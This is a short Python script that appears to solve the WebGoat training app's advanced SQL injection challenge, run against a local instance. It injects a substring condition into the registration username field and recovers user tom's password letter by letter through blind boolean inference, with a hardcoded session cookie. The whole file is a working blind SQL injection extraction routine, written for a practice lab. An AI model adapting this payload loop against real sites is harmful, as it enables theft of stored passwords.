import json
import requests

#수정전 file명 : WebgoatblindSQL.py
def sql_injection_advanced_5():
    alphabet_index = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    password_index = 0
    password = ''
    headers = {
        'Cookie': 'JSESSIONID=JD_GZbKXqWu1sGjw3ZEd4II8r-Tq95N7cmLhrOWu'
    }

    while True:
        payload = 'tom\' AND substring(password,{},1)=\'{}'.format(password_index + 1, 
alphabet[alphabet_index])
        
        data = {
            'username_reg': payload,
            'email_reg': 'a@b.c',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }
        
        r = requests.put('http://127.0.0.1:8080/WebGoat/SqlinjectionAdvanced/challenge', headers=headers, data=data)

        try:
            response = json.loads(r.text)
        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return
        
        if "already exists please try to register with a different username." not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(alphabet) - 1:
                return
        else:
            password += alphabet[alphabet_index]
            print(password)
            alphabet_index = 0
            password_index += 1

sql_injection_advanced_5()